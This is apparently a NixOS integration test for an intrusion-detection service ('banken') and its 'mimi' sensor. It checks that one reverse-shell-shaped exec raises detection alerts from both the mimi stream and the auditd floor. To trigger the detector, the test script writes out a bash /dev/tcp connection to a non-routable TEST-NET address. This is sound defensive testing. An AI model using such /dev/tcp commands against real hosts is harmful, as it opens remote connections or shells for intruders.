# Reproduce the LIVE hokkaido config: services.banken.mimi.enable with the auditd floor left ON
# (audit.enable defaults true), unlike switch.nix which turns audit off to isolate mimi. With the
# switch on, banken runs as ONE --watch daemon that follows BOTH sources via inotify: the mimi OCSF
# stream AND the auditd log (the module names the auditd source alongside mimi so a sensor adds to
# the floor, never replaces it).
#
# This proves the deployed failure cannot silently return. That failure was: under floor + mimi,
# step 4 saw NO mimi-sourced reverse_shell alert (the auditd floor fired, mimi was silent). So the
# teeth here are BOTH halves for one reverse-shell exec, keyed to a unique port:
#   - a reverse_shell alert with data_sources == ["mimi"]   (the half that went missing on deploy)
#   - a reverse_shell alert with data_sources == ["auditd"] (the floor is still firing underneath)
# Either one absent is a RED. The diagnostic dumps (cursor, journal, port counts) are kept so a
# failure shows the break point in the build log.
{ pkgs, banken, mimiModule }:
pkgs.testers.runNixOSTest {
  name = "banken-mimi-switch-floor";
  nodes.machine = {
    imports = [ ../module.nix mimiModule ];
    services.banken = {
      enable = true;
      package = banken;
      alerts.jsonl = { enable = true; format = "ocsf"; };
      mimi.enable = true;
      # audit.enable left at its default (true): floor + mimi, exactly like the deployed host.
    };
    users.users.alice.isNormalUser = true;
    environment.systemPackages = [ pkgs.python3 ];
    virtualisation.memorySize = 2048;
  };
  testScript = ''
    import json, time
    machine.wait_for_unit("mimi.service")
    machine.wait_for_unit("banken.service")
    machine.wait_for_file("/var/log/mimi/events.jsonl")
    machine.wait_until_succeeds("test -s /var/log/mimi/events.jsonl")

    # The switch makes banken the --watch follower (both sources), not the oneshot timer floor.
    machine.succeed("systemctl show -p ExecStart banken.service | grep -- --watch")

    def alerts():
        out = machine.succeed("cat /var/log/banken/alerts-*.jsonl 2>/dev/null || true")
        return [json.loads(l) for l in out.splitlines() if l.strip()]

    def rev_hit(port, source):
        # A reverse_shell Detection Finding for `port` sourced from exactly `source`.
        for a in alerts():
            fi = a.get("finding_info") or {}
            if (fi.get("analytic") or {}).get("name") != "reverse_shell":
                continue
            if fi.get("data_sources") != [source]:
                continue
            if port in json.dumps(a):
                return a
        return None

    print("=== CURSOR ===\n" + machine.execute("ls -l /var/lib/banken/cursor.json.mimi 2>&1")[1])
    print("=== BANKEN.YML ===\n" + machine.execute("grep -iE 'mimi|type:|path:' /etc/banken/banken.yml 2>&1")[1])
    print("=== BANKEN JOURNAL (follow/stream/mimi/error) ===\n" +
          machine.execute("journalctl -u banken.service --no-pager | grep -iE 'follow|stream|mimi|error|scan' | tail -20")[1])

    # A benign reverse-shell-shaped exec as an unprivileged user. 192.0.2.1 is TEST-NET-1 (routes
    # nowhere); the command SHAPE fires reverse_shell. The unique port ties both alerts back to
    # exactly this exec. Backgrounded so timing starts at exec, not after the connect times out.
    port = "47123"
    t0 = time.monotonic()
    machine.succeed(
        f"(runuser -u alice -- timeout 3 bash -c 'exec 3<>/dev/tcp/192.0.2.1/{port}' >/dev/null 2>&1 &) ; true"
    )

    # mimi is a continuous push stream (inotify, capture-to-match latency), so its alert lands in
    # ~1-2s. The auditd source is the periodic FLOOR: `banken --watch` follows the sensor stream
    # continuously but scans the remaining (auditd) sources on --interval, which the module leaves at
    # banken's 2-minute default (one scan at daemon start, then every interval). The reverse-shell
    # exec lands after that startup scan, so the auditd-sourced alert only appears on the NEXT tick.
    # So we wait past one interval for the floor half. (Proven once here: 2 min of real wall-clock.)
    mimi_hit = None
    auditd_hit = None
    for i in range(1000):  # up to ~200s: covers one 2-minute floor tick with margin
        mimi_hit = mimi_hit or rev_hit(port, "mimi")
        auditd_hit = auditd_hit or rev_hit(port, "auditd")
        if mimi_hit and auditd_hit:
            break
        if mimi_hit and i == 60:  # ~12s in: the stream half is proven, note the wait for the floor
            print("[switch-floor] mimi half proven; waiting for the periodic auditd floor tick (<=2 min)...")
        time.sleep(0.2)
    latency_ms = (time.monotonic() - t0) * 1000

    print("=== MIMI CAPTURED THE EXEC? (port count in stream) ===\n" +
          machine.execute(f"grep -c {port} /var/log/mimi/events.jsonl")[1])
    print("=== ALERTS FOR THE PORT ===\n" +
          machine.execute(f"grep {port} /var/log/banken/alerts-*.jsonl 2>/dev/null | head -5")[1])
    print("=== BANKEN JOURNAL AFTER (capture-to-match / mimi / error) ===\n" +
          machine.execute("journalctl -u banken.service --no-pager | grep -iE 'capture to match|mimi|follow|error' | tail -20")[1])
    print("=== CURSOR AFTER ===\n" + machine.execute("cat /var/lib/banken/cursor.json.mimi 2>&1")[1])

    # THE teeth. The deploy bug was a silent-missing MIMI alert while the floor fired; both must be
    # present under floor + mimi, keyed to this port.
    assert mimi_hit is not None, \
        f"no mimi-sourced reverse_shell alert for port {port} (the deployed failure: floor on, mimi silent)"
    assert auditd_hit is not None, \
        f"no auditd-sourced reverse_shell alert for port {port} within one floor interval (~2 min): the periodic auditd floor is not firing under mimi"
    # OCSF 1.3.0 Detection Finding shape, and the mimi alert's provenance is in mimi's own stream.
    assert mimi_hit["class_uid"] == 2004 and mimi_hit["metadata"]["version"] == "1.3.0", mimi_hit
    assert mimi_hit["finding_info"]["data_sources"] == ["mimi"], mimi_hit["finding_info"]["data_sources"]
    assert auditd_hit["finding_info"]["data_sources"] == ["auditd"], auditd_hit["finding_info"]["data_sources"]
    machine.succeed(f"grep -q {port} /var/log/mimi/events.jsonl")

    print(f"SWITCH-FLOOR PASS: under floor + mimi, reverse_shell fired from BOTH sources (mimi AND "
          f"the auditd floor) for port {port}; exec->both-alerts {latency_ms:.0f} ms")
  '';
}
